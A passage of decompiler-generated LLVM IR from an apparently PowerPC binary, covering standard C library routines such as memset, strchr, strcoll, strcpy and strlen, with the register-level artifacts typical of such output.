dec_label_pc_1000f4a8:                            ; preds = %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge, %dec_label_pc_1000f458
  %v0_1000f4a8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f4a8

; uselistorder directives
  uselistorder i32 %v1_1000f49c, { 1, 2, 0 }
  uselistorder i32 %v1_1000f498, { 1, 0 }
  uselistorder i32 %v1_1000f494, { 1, 0 }
  uselistorder i32 %v0_1000f488, { 1, 0 }
  uselistorder i32 %v2_1000f484, { 2, 1, 0 }
  uselistorder i32 %v1_1000f474, { 1, 0 }
  uselistorder i32 %v3_1000f470, { 1, 2, 0 }
  uselistorder i32 %v1_1000f440, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f43c, { 1, 0 }
  uselistorder i32 %v2_1000f438, { 1, 2, 0 }
  uselistorder i32 %v1_1000f420, { 1, 0 }
  uselistorder i32 %v1_1000f418, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f46c.dec_label_pc_1000f46c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f458, { 1, 0 }
  uselistorder label %dec_label_pc_1000f440, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000f4ac = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000f4ac, i32* %r9.global-to-local, align 4
  %v4_1000f4ac = icmp eq i32 %v1_1000f4ac, 0
  store i1 %v4_1000f4ac, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000f4b4 = add i32 %arg1, -4
  store i32 %v1_1000f4b4, i32* %r11.global-to-local, align 4
  %v1_1000f4b8 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000f4bc = call i32 @__asm_rlwimi(i32 %v1_1000f4b8, i32 16, i32 0, i32 15)
  %v2_1000f4bc = trunc i32 %v1_1000f4bc to i8
  %v0_1000f4c0 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000f4c0, label %dec_label_pc_1000f4e4, label %dec_label_pc_1000f4c4

dec_label_pc_1000f4c4:                            ; preds = %entry
  %v0_1000f4c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f4c4 = urem i32 %v0_1000f4c4, 4
  %v3_1000f4c4 = icmp eq i32 %v1_1000f4c4, 0
  store i1 %v3_1000f4c4, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000f4c4, label %dec_label_pc_1000f4c4.dec_label_pc_1000f4cc_crit_edge, label %dec_label_pc_1000f514

dec_label_pc_1000f4c4.dec_label_pc_1000f4cc_crit_edge: ; preds = %dec_label_pc_1000f4c4
  %v0_1000f4cc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f4cc

dec_label_pc_1000f4cc:                            ; preds = %dec_label_pc_1000f52c.dec_label_pc_1000f4cc_crit_edge, %dec_label_pc_1000f4c4.dec_label_pc_1000f4cc_crit_edge
  %v0_1000f4d0.pre = phi i32 [ %v0_1000f4c4, %dec_label_pc_1000f4c4.dec_label_pc_1000f4cc_crit_edge ], [ %v0_1000f4d0.pre.pre, %dec_label_pc_1000f52c.dec_label_pc_1000f4cc_crit_edge ]
  %v0_1000f4cc = phi i32 [ %v0_1000f4cc.pre, %dec_label_pc_1000f4c4.dec_label_pc_1000f4cc_crit_edge ], [ %v1_1000f52c, %dec_label_pc_1000f52c.dec_label_pc_1000f4cc_crit_edge ]
  store i32 %v0_1000f4cc, i32* %ctr.global-to-local, align 4
  %v1_1000f4d4 = sext i8 %v2_1000f4bc to i32
  br label %dec_label_pc_1000f4d0

dec_label_pc_1000f4d0:                            ; preds = %dec_label_pc_1000f4d0, %dec_label_pc_1000f4cc
  %v0_1000f4d0 = phi i32 [ %v1_1000f4dc, %dec_label_pc_1000f4d0 ], [ %v0_1000f4d0.pre, %dec_label_pc_1000f4cc ]
  %v1_1000f4d0 = add i32 %v0_1000f4d0, 4
  store i32 %v1_1000f4d0, i32* %r9.global-to-local, align 4
  %v4_1000f4d4 = inttoptr i32 %v1_1000f4d0 to i32*
  store i32 %v1_1000f4d4, i32* %v4_1000f4d4, align 4
  %v2_1000f4d8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f4d8 = add i32 %v2_1000f4d8, 4
  %v4_1000f4d8 = inttoptr i32 %v3_1000f4d8 to i32*
  store i32 %v1_1000f4d4, i32* %v4_1000f4d8, align 4
  %v0_1000f4dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4dc = add i32 %v0_1000f4dc, 4
  store i32 %v1_1000f4dc, i32* %r11.global-to-local, align 4
  %v0_1000f4e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f4e0 = add i32 %v0_1000f4e0, -1
  store i32 %v1_1000f4e0, i32* %ctr.global-to-local, align 4
  %v2_1000f4e0 = icmp eq i32 %v1_1000f4e0, 0
  br i1 %v2_1000f4e0, label %dec_label_pc_1000f4e4, label %dec_label_pc_1000f4d0

dec_label_pc_1000f4e4:                            ; preds = %dec_label_pc_1000f4d0, %dec_label_pc_1000f52c, %entry
  %v0_1000f4e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f4e4 = urem i32 %v0_1000f4e4, 8
  store i32 %v1_1000f4e4, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000f4e4, 4
  br i1 %tmp, label %dec_label_pc_1000f4f8, label %dec_label_pc_1000f4f0

dec_label_pc_1000f4f0:                            ; preds = %dec_label_pc_1000f4e4
  %v1_1000f4f0 = sext i8 %v2_1000f4bc to i32
  %v2_1000f4f0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000f4f0 = add i32 %v2_1000f4f0, 4
  %v4_1000f4f0 = inttoptr i32 %v3_1000f4f0 to i32*
  store i32 %v1_1000f4f0, i32* %v4_1000f4f0, align 4
  store i32 %v3_1000f4f0, i32* %r11.global-to-local, align 4
  %v0_1000f4f4 = load i32, i32* @r5, align 4
  %v1_1000f4f4 = add i32 %v0_1000f4f4, -4
  store i32 %v1_1000f4f4, i32* @r5, align 4
  br label %dec_label_pc_1000f4f8

dec_label_pc_1000f4f8:                            ; preds = %dec_label_pc_1000f4e4, %dec_label_pc_1000f4f0
  %v0_1000f4f8 = phi i32 [ %v1_1000f4e4, %dec_label_pc_1000f4e4 ], [ %v1_1000f4f4, %dec_label_pc_1000f4f0 ]
  %v3_1000f4f8 = icmp eq i32 %v0_1000f4f8, 0
  %v0_1000f4fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f4f8, i32 %v0_1000f4fc)
  %v0_1000f500 = load i32, i32* @r5, align 4
  store i32 %v0_1000f500, i32* %ctr.global-to-local, align 4
  %v0_1000f504 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f504 = add i32 %v0_1000f504, 3
  store i32 %v1_1000f504, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f508

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f508, %dec_label_pc_1000f4f8
  %v3_1000f508 = phi i32 [ %v4_1000f508, %dec_label_pc_1000f508 ], [ %v1_1000f504, %dec_label_pc_1000f4f8 ]
  %v4_1000f508 = add i32 %v3_1000f508, 1
  %v5_1000f508 = inttoptr i32 %v4_1000f508 to i8*
  store i8 %v2_1000f4bc, i8* %v5_1000f508, align 1
  store i32 %v4_1000f508, i32* %r9.global-to-local, align 4
  %v0_1000f50c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f50c = add i32 %v0_1000f50c, -1
  store i32 %v1_1000f50c, i32* %ctr.global-to-local, align 4
  %v2_1000f50c = icmp eq i32 %v1_1000f50c, 0
  br i1 %v2_1000f50c, label %dec_label_pc_1000f538, label %dec_label_pc_1000f508

dec_label_pc_1000f514:                            ; preds = %dec_label_pc_1000f4c4
  %v1_1000f514 = sub nsw i32 4, %v1_1000f4c4
  store i32 %v1_1000f514, i32* %ctr.global-to-local, align 4
  %v1_1000f51c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f51c = sub i32 %v1_1000f51c, %v1_1000f514
  store i32 %v2_1000f51c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000f520

dec_label_pc_1000f520:                            ; preds = %dec_label_pc_1000f520, %dec_label_pc_1000f514
  %v3_1000f520 = phi i32 [ %v1_1000f524, %dec_label_pc_1000f520 ], [ %v0_1000f4c4, %dec_label_pc_1000f514 ]
  %v4_1000f520 = add i32 %v3_1000f520, 4
  %v5_1000f520 = inttoptr i32 %v4_1000f520 to i8*
  store i8 %v2_1000f4bc, i8* %v5_1000f520, align 1
  %v0_1000f524 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f524 = add i32 %v0_1000f524, 1
  store i32 %v1_1000f524, i32* %r11.global-to-local, align 4
  %v0_1000f528 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f528 = add i32 %v0_1000f528, -1
  store i32 %v1_1000f528, i32* %ctr.global-to-local, align 4
  %v2_1000f528 = icmp eq i32 %v1_1000f528, 0
  br i1 %v2_1000f528, label %dec_label_pc_1000f52c, label %dec_label_pc_1000f520

dec_label_pc_1000f52c:                            ; preds = %dec_label_pc_1000f520
  %v0_1000f52c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f52c = call i32 @__asm_rlwinm.(i32 %v0_1000f52c, i32 29, i32 3, i32 31)
  store i32 %v1_1000f52c, i32* %r9.global-to-local, align 4
  %v4_1000f52c = icmp eq i32 %v1_1000f52c, 0
  store i1 %v4_1000f52c, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000f52c, label %dec_label_pc_1000f4e4, label %dec_label_pc_1000f52c.dec_label_pc_1000f4cc_crit_edge

dec_label_pc_1000f52c.dec_label_pc_1000f4cc_crit_edge: ; preds = %dec_label_pc_1000f52c
  %v0_1000f4d0.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f4cc

dec_label_pc_1000f538:                            ; preds = %dec_label_pc_1000f508
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000f52c, { 1, 2, 0 }
  uselistorder i32 %v1_1000f528, { 1, 0 }
  uselistorder i32 %v1_1000f524, { 1, 0 }
  uselistorder i32 %v1_1000f50c, { 1, 0 }
  uselistorder i32 %v4_1000f508, { 1, 2, 0 }
  uselistorder i32 %v1_1000f4e4, { 2, 1, 0 }
  uselistorder i32 %v1_1000f4e0, { 1, 0 }
  uselistorder i32 %v1_1000f4dc, { 1, 0 }
  uselistorder i32 %v1_1000f4c4, { 1, 0 }
  uselistorder i32 %v0_1000f4c4, { 2, 1, 0 }
  uselistorder i8 %v2_1000f4bc, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f4f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4e4, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000f53c = urem i32 %arg1, 256
  store i32 %v1_1000f53c, i32* %r4.global-to-local, align 4
  %v0_1000f55c2 = load i32, i32* @r3, align 4
  %v1_1000f55c3 = urem i32 %v0_1000f55c2, 4
  %v3_1000f55c5 = icmp eq i32 %v1_1000f55c3, 0
  br i1 %v3_1000f55c5, label %dec_label_pc_1000f564, label %dec_label_pc_1000f544

dec_label_pc_1000f544:                            ; preds = %entry, %dec_label_pc_1000f558
  %v1_1000f548 = phi i32 [ %v0_1000f564.pre, %dec_label_pc_1000f558 ], [ %v1_1000f53c, %entry ]
  %v0_1000f544 = phi i32 [ %v1_1000f558, %dec_label_pc_1000f558 ], [ %v0_1000f55c2, %entry ]
  %v1_1000f544 = inttoptr i32 %v0_1000f544 to i8*
  %v2_1000f544 = load i8, i8* %v1_1000f544, align 1
  %v3_1000f544 = zext i8 %v2_1000f544 to i32
  %v4_1000f548 = icmp eq i32 %v3_1000f544, %v1_1000f548
  %v3_1000f54c = icmp eq i8 %v2_1000f544, 0
  %v0_1000f550 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f548, i32 %v0_1000f550)
  br i1 %v3_1000f54c, label %dec_label_pc_1000f634, label %dec_label_pc_1000f558

dec_label_pc_1000f558:                            ; preds = %dec_label_pc_1000f544
  %v0_1000f558 = load i32, i32* @r3, align 4
  %v1_1000f558 = add i32 %v0_1000f558, 1
  store i32 %v1_1000f558, i32* @r3, align 4
  %v1_1000f55c = urem i32 %v1_1000f558, 4
  %v3_1000f55c = icmp eq i32 %v1_1000f55c, 0
  %v0_1000f564.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000f55c, label %dec_label_pc_1000f564, label %dec_label_pc_1000f544

dec_label_pc_1000f564:                            ; preds = %dec_label_pc_1000f558, %entry
  %v0_1000f57c10 = phi i32 [ %v0_1000f55c2, %entry ], [ %v1_1000f558, %dec_label_pc_1000f558 ]
  %v0_1000f564 = phi i32 [ %v1_1000f53c, %entry ], [ %v0_1000f564.pre, %dec_label_pc_1000f558 ]
  %v1_1000f564 = mul i32 %v0_1000f564, 256
  %v2_1000f56c = or i32 %v1_1000f564, %v0_1000f564
  %v1_1000f574 = mul i32 %v2_1000f56c, 65536
  %v2_1000f578 = or i32 %v1_1000f574, %v2_1000f56c
  br label %dec_label_pc_1000f57c

dec_label_pc_1000f57c:                            ; preds = %dec_label_pc_1000f57c, %dec_label_pc_1000f630, %dec_label_pc_1000f564
  %v0_1000f5d4 = phi i32 [ %v0_1000f57c10, %dec_label_pc_1000f564 ], [ %v1_1000f580, %dec_label_pc_1000f630 ], [ %v1_1000f580, %dec_label_pc_1000f57c ]
  %v1_1000f57c = inttoptr i32 %v0_1000f5d4 to i32*
  %v2_1000f57c = load i32, i32* %v1_1000f57c, align 4
  %v1_1000f580 = add i32 %v0_1000f5d4, 4
  %v2_1000f588 = xor i32 %v2_1000f57c, %v2_1000f578
  %v1_1000f58c = add i32 %v2_1000f57c, 2130640639
  %v2_1000f594 = xor i32 %v1_1000f58c, %v2_1000f57c
  %v1_1000f598 = add i32 %v2_1000f588, 2130640639
  %v2_1000f59c = and i32 %v2_1000f594, -2130640640
  %v3_1000f59c = xor i32 %v2_1000f59c, -2130640640
  %v2_1000f5a0 = xor i32 %v1_1000f598, %v2_1000f588
  %v2_1000f5a4 = and i32 %v2_1000f5a0, -2130640640
  %v3_1000f5a4 = xor i32 %v2_1000f5a4, -2130640640
  %v1_1000f5b0 = add i32 %v0_1000f5d4, 1
  %tmp = or i32 %v3_1000f5a4, %v3_1000f59c
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000f57c, label %dec_label_pc_1000f5bc

dec_label_pc_1000f5bc:                            ; preds = %dec_label_pc_1000f57c
  %v2_1000f5bc = inttoptr i32 %v0_1000f5d4 to i8*
  %v3_1000f5bc = load i8, i8* %v2_1000f5bc, align 1
  %v4_1000f5bc = zext i8 %v3_1000f5bc to i32
  %v1_1000f5c0 = add i32 %v0_1000f5d4, 2
  %v1_1000f5c4 = add i32 %v0_1000f5d4, 3
  %v4_1000f5c8 = icmp eq i32 %v4_1000f5bc, %v0_1000f564
  br i1 %v4_1000f5c8, label %dec_label_pc_1000f5d4, label %dec_label_pc_1000f5dc

dec_label_pc_1000f5d4:                            ; preds = %dec_label_pc_1000f5bc
  ret i32 %v0_1000f5d4

dec_label_pc_1000f5dc:                            ; preds = %dec_label_pc_1000f5bc
  %v3_1000f5cc = icmp eq i8 %v3_1000f5bc, 0
  br i1 %v3_1000f5cc, label %dec_label_pc_1000f634, label %dec_label_pc_1000f5e0

dec_label_pc_1000f5e0:                            ; preds = %dec_label_pc_1000f5dc
  %v2_1000f5e0 = inttoptr i32 %v1_1000f5b0 to i8*
  %v3_1000f5e0 = load i8, i8* %v2_1000f5e0, align 1
  %v4_1000f5e0 = zext i8 %v3_1000f5e0 to i32
  %v4_1000f5e4 = icmp eq i32 %v4_1000f5e0, %v0_1000f564
  br i1 %v4_1000f5e4, label %dec_label_pc_1000f5f0, label %dec_label_pc_1000f5f8

dec_label_pc_1000f5f0:                            ; preds = %dec_label_pc_1000f5e0
  ret i32 %v1_1000f5b0

dec_label_pc_1000f5f8:                            ; preds = %dec_label_pc_1000f5e0
  %v3_1000f5e8 = icmp eq i8 %v3_1000f5e0, 0
  br i1 %v3_1000f5e8, label %dec_label_pc_1000f634, label %dec_label_pc_1000f5fc

dec_label_pc_1000f5fc:                            ; preds = %dec_label_pc_1000f5f8
  %v2_1000f5fc = inttoptr i32 %v1_1000f5c0 to i8*
  %v3_1000f5fc = load i8, i8* %v2_1000f5fc, align 1
  %v4_1000f5fc = zext i8 %v3_1000f5fc to i32
  %v4_1000f600 = icmp eq i32 %v4_1000f5fc, %v0_1000f564
  br i1 %v4_1000f600, label %dec_label_pc_1000f60c, label %dec_label_pc_1000f614

dec_label_pc_1000f60c:                            ; preds = %dec_label_pc_1000f5fc
  ret i32 %v1_1000f5c0

dec_label_pc_1000f614:                            ; preds = %dec_label_pc_1000f5fc
  %v3_1000f604 = icmp eq i8 %v3_1000f5fc, 0
  br i1 %v3_1000f604, label %dec_label_pc_1000f634, label %dec_label_pc_1000f618

dec_label_pc_1000f618:                            ; preds = %dec_label_pc_1000f614
  %v2_1000f618 = inttoptr i32 %v1_1000f5c4 to i8*
  %v3_1000f618 = load i8, i8* %v2_1000f618, align 1
  %v4_1000f618 = zext i8 %v3_1000f618 to i32
  %v4_1000f61c = icmp eq i32 %v4_1000f618, %v0_1000f564
  br i1 %v4_1000f61c, label %dec_label_pc_1000f628, label %dec_label_pc_1000f630

dec_label_pc_1000f628:                            ; preds = %dec_label_pc_1000f618
  ret i32 %v1_1000f5c4

dec_label_pc_1000f630:                            ; preds = %dec_label_pc_1000f618
  %v3_1000f620 = icmp eq i8 %v3_1000f618, 0
  br i1 %v3_1000f620, label %dec_label_pc_1000f634, label %dec_label_pc_1000f57c

dec_label_pc_1000f634:                            ; preds = %dec_label_pc_1000f544, %dec_label_pc_1000f630, %dec_label_pc_1000f614, %dec_label_pc_1000f5f8, %dec_label_pc_1000f5dc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000f580, { 1, 0 }
  uselistorder i32 %v2_1000f57c, { 0, 2, 1 }
  uselistorder i32 %v0_1000f5d4, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000f56c, { 1, 0 }
  uselistorder i32 %v0_1000f564, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f558, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000f55c2, { 2, 1, 0 }
  uselistorder i32 %v1_1000f53c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f634, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f57c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f544, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f648.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000f640

dec_label_pc_1000f640:                            ; preds = %dec_label_pc_1000f664, %entry
  %v0_1000f648 = phi i32 [ %v1_1000f64c, %dec_label_pc_1000f664 ], [ %v0_1000f648.pre, %entry ]
  %v0_1000f640 = phi i32 [ %v1_1000f644, %dec_label_pc_1000f664 ], [ %tmp, %entry ]
  %v1_1000f640 = inttoptr i32 %v0_1000f640 to i8*
  %v2_1000f640 = load i8, i8* %v1_1000f640, align 1
  %v3_1000f640 = zext i8 %v2_1000f640 to i32
  %v1_1000f648 = inttoptr i32 %v0_1000f648 to i8*
  %v2_1000f648 = load i8, i8* %v1_1000f648, align 1
  %v3_1000f648 = zext i8 %v2_1000f648 to i32
  %v3_1000f650 = icmp eq i8 %v2_1000f640, 0
  br i1 %v3_1000f650, label %dec_label_pc_1000f65c, label %dec_label_pc_1000f664

dec_label_pc_1000f65c:                            ; preds = %dec_label_pc_1000f640
  %v1_1000f65c = sub nsw i32 0, %v3_1000f648
  ret i32 %v1_1000f65c

dec_label_pc_1000f664:                            ; preds = %dec_label_pc_1000f640
  %v4_1000f654 = icmp eq i8 %v2_1000f640, %v2_1000f648
  %v1_1000f64c = add i32 %v0_1000f648, 1
  %v1_1000f644 = add i32 %v0_1000f640, 1
  br i1 %v4_1000f654, label %dec_label_pc_1000f640, label %dec_label_pc_1000f668

dec_label_pc_1000f668:                            ; preds = %dec_label_pc_1000f664
  %v2_1000f668 = sub nsw i32 %v3_1000f640, %v3_1000f648
  ret i32 %v2_1000f668

; uselistorder directives
  uselistorder i32 %v3_1000f648, { 1, 0 }
  uselistorder i32 %v0_1000f640, { 1, 0 }
  uselistorder i32 %v0_1000f648, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000f670 = add i32 %arg1, -1
  %v1_1000f674 = sub i32 %v2_1000f670, %tmp
  store i32 %v1_1000f674, i32* %r9.global-to-local, align 4
  %v2_1000f6784 = load i8, i8* %arg2, align 1
  %v1_1000f67c6 = add i32 %tmp, 1
  store i32 %v1_1000f67c6, i32* %r4.global-to-local, align 4
  %v3_1000f6808 = icmp eq i8 %v2_1000f6784, 0
  store i1 %v3_1000f6808, i1* %cr7_eq.global-to-local, align 1
  %v5_1000f6849 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000f6784, i8* %v5_1000f6849, align 1
  %v0_1000f68810 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f68810, label %dec_label_pc_1000f68c, label %dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge

dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge: ; preds = %entry, %dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge
  %v0_1000f678.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000f684.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f678 = inttoptr i32 %v0_1000f678.pre to i8*
  %v2_1000f678 = load i8, i8* %v1_1000f678, align 1
  %v1_1000f67c = add i32 %v0_1000f678.pre, 1
  store i32 %v1_1000f67c, i32* %r4.global-to-local, align 4
  %v3_1000f680 = icmp eq i8 %v2_1000f678, 0
  store i1 %v3_1000f680, i1* %cr7_eq.global-to-local, align 1
  %v4_1000f684 = add i32 %v1_1000f67c, %v2_1000f684.pre
  %v5_1000f684 = inttoptr i32 %v4_1000f684 to i8*
  store i8 %v2_1000f678, i8* %v5_1000f684, align 1
  %v0_1000f688 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f688, label %dec_label_pc_1000f68c, label %dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge

dec_label_pc_1000f68c:                            ; preds = %dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f678.dec_label_pc_1000f678_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000f690 = load i32, i32* @r3, align 4
  %v1_1000f6a83 = urem i32 %v0_1000f690, 4
  %v3_1000f6a85 = icmp eq i32 %v1_1000f6a83, 0
  br i1 %v3_1000f6a85, label %dec_label_pc_1000f6b0, label %dec_label_pc_1000f698

dec_label_pc_1000f698:                            ; preds = %entry, %dec_label_pc_1000f6a4
  %v0_1000f6a4 = phi i32 [ %v1_1000f6a4, %dec_label_pc_1000f6a4 ], [ %v0_1000f690, %entry ]
  %v1_1000f698 = inttoptr i32 %v0_1000f6a4 to i8*
  %v2_1000f698 = load i8, i8* %v1_1000f698, align 1
  %v3_1000f69c = icmp eq i8 %v2_1000f698, 0
  br i1 %v3_1000f69c, label %dec_label_pc_1000f6e4, label %dec_label_pc_1000f6a4

dec_label_pc_1000f6a4:                            ; preds = %dec_label_pc_1000f698
  %v1_1000f6a4 = add i32 %v0_1000f6a4, 1
  %v1_1000f6a8 = urem i32 %v1_1000f6a4, 4
  %v3_1000f6a8 = icmp eq i32 %v1_1000f6a8, 0
  br i1 %v3_1000f6a8, label %dec_label_pc_1000f6b0, label %dec_label_pc_1000f698

dec_label_pc_1000f6b0:                            ; preds = %dec_label_pc_1000f6a4, %entry
  %v0_1000f6b4 = phi i32 [ %v0_1000f690, %entry ], [ %v1_1000f6a4, %dec_label_pc_1000f6a4 ]
  br label %dec_label_pc_1000f6bc

dec_label_pc_1000f6bc:                            ; preds = %dec_label_pc_1000f71c, %dec_label_pc_1000f6bc, %dec_label_pc_1000f6b0
  %v1_1000f6f8 = phi i32 [ %v0_1000f6b4, %dec_label_pc_1000f6b0 ], [ %v1_1000f6c0, %dec_label_pc_1000f6bc ], [ %v1_1000f6c0, %dec_label_pc_1000f71c ]
  %v1_1000f6bc = inttoptr i32 %v1_1000f6f8 to i32*
  %v2_1000f6bc = load i32, i32* %v1_1000f6bc, align 4
  %v1_1000f6c0 = add i32 %v1_1000f6f8, 4
  %v1_1000f6cc = add i32 %v2_1000f6bc, -16843009
  %v2_1000f6d0 = and i32 %v1_1000f6cc, -2139062144
  %v5_1000f6d0 = icmp eq i32 %v2_1000f6d0, 0
  br i1 %v5_1000f6d0, label %dec_label_pc_1000f6bc, label %dec_label_pc_1000f6d8

dec_label_pc_1000f6d8:                            ; preds = %dec_label_pc_1000f6bc
  %v2_1000f6d8 = inttoptr i32 %v1_1000f6f8 to i8*
  %v3_1000f6d8 = load i8, i8* %v2_1000f6d8, align 1
  %v3_1000f6dc = icmp eq i8 %v3_1000f6d8, 0
  br i1 %v3_1000f6dc, label %dec_label_pc_1000f6e4, label %dec_label_pc_1000f6ec

dec_label_pc_1000f6e4:                            ; preds = %dec_label_pc_1000f698, %dec_label_pc_1000f6d8
  %v1_1000f6e4 = phi i32 [ %v1_1000f6f8, %dec_label_pc_1000f6d8 ], [ %v0_1000f6a4, %dec_label_pc_1000f698 ]
  %v2_1000f6e4 = sub i32 %v1_1000f6e4, %v0_1000f690
  ret i32 %v2_1000f6e4

dec_label_pc_1000f6ec:                            ; preds = %dec_label_pc_1000f6d8
  %v1_1000f6ec = add i32 %v1_1000f6f8, 1
  %v2_1000f6ec = inttoptr i32 %v1_1000f6ec to i8*
  %v3_1000f6ec = load i8, i8* %v2_1000f6ec, align 1
  %v3_1000f6f0 = icmp eq i8 %v3_1000f6ec, 0
  br i1 %v3_1000f6f0, label %dec_label_pc_1000f6f8, label %dec_label_pc_1000f704

dec_label_pc_1000f6f8:                            ; preds = %dec_label_pc_1000f6ec
  %v2_1000f6f8 = sub i32 %v1_1000f6f8, %v0_1000f690
  %v1_1000f6fc = add i32 %v2_1000f6f8, 1
  ret i32 %v1_1000f6fc

dec_label_pc_1000f704:                            ; preds = %dec_label_pc_1000f6ec
  %v1_1000f704 = add i32 %v1_1000f6f8, 2
  %v2_1000f704 = inttoptr i32 %v1_1000f704 to i8*
  %v3_1000f704 = load i8, i8* %v2_1000f704, align 1
  %v3_1000f708 = icmp eq i8 %v3_1000f704, 0
  br i1 %v3_1000f708, label %dec_label_pc_1000f710, label %dec_label_pc_1000f71c

dec_label_pc_1000f710:                            ; preds = %dec_label_pc_1000f704
  %v2_1000f710 = sub i32 %v1_1000f6f8, %v0_1000f690
  %v1_1000f714 = add i32 %v2_1000f710, 2
  ret i32 %v1_1000f714

dec_label_pc_1000f71c:                            ; preds = %dec_label_pc_1000f704
  %v1_1000f71c = add i32 %v1_1000f6f8, 3
  %v2_1000f71c = inttoptr i32 %v1_1000f71c to i8*
  %v3_1000f71c = load i8, i8* %v2_1000f71c, align 1
  %v3_1000f720 = icmp eq i8 %v3_1000f71c, 0
  br i1 %v3_1000f720, label %dec_label_pc_1000f728, label %dec_label_pc_1000f6bc

dec_label_pc_1000f728:                            ; preds = %dec_label_pc_1000f71c
  %v2_1000f728 = sub i32 %v1_1000f6f8, %v0_1000f690
  %v1_1000f72c = add i32 %v2_1000f728, 3
  ret i32 %v1_1000f72c

; uselistorder directives
  uselistorder i32 %v1_1000f6c0, { 1, 0 }
